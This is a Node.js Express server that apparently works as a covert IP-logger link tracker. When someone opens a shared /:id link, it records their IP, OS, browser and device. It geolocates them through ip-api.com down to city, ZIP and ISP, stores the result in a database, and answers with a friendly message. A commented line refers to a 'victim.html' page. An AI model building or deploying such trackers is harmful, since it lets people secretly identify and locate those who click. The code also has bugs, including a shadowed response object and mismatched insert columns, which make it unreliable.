const express = require('express');
const requestIp = require('request-ip');
const { sql } = require('./db/create_db');
const DeviceDetector = require('node-device-detector')
const http = require('http')

const app = express();
const port = 3000;

const detector = new DeviceDetector({
  clientIndexes: true,
  deviceIndexes: true,
  deviceAliasCode: false,
});

const parseIp = (req) =>
    req.headers['x-forwarded-for']?.split(',').shift()
    || req.socket?.remoteAddress

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});

app.get('/view/:id', (req, res) => {
  res.send(req.params.id)
});

app.get('/:id', async (req,res) => {
  // Fingerprint the user
  const now = new Date()
  let userAgent = req.get('User-Agent')
  console.log("processing user agent...")
  let device = detector.detect(userAgent)
  let ipinfo = {}
  let dnsinfo = ''
  let ip = parseIp(req)
  http.get(`http://ip-api.com/json/${ip}?fields=zip,status,message,city,regionName,country,isp,org,as,mobile,proxy,hosting,dns`, res => {
    let data = ''
    res.on('data', info => {
        data += info;
    })
    res.on('end', () => {
      let dataObj = JSON.parse(data)

      let visit = [
        req.params.id,
        now.getTime(), // date/time
        requestIp.getClientIp(req) || ip, // ip
        `${device.os.name} ${device.os.version}`,
        `${device.client.type} - ${device.client.name} ${device.client.version}`,
        `${device.device.type} - ${device.device.type} ${device.device.model}`,
      
      ]
      visit.push(dataObj.country)
      visit.push(dataObj.regionName)
      visit.push(dataObj.city)
      visit.push(dataObj.isp)
      visit.push(dataObj.zip)
      visit.push(dataObj.org)
      visit.push(dataObj.as)
      visit.push(dataObj.proxy ? "yes" : "no")
      
      sql.query(`INSERT INTO clickInfo (id, date, ip, os, client, device, nation, region, city, zip, isp, organization, asn, proxy) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`, visit, (err) => {
        if (err) {
            console.log("error when inserting into table", err);
            res.send(500);
        }
      });
      })
    }).on('error', err => {
      console.log(err)
  })
  // res.sendFile("victim.html")
  res.send("Hi, hope you enjoy sharing")
})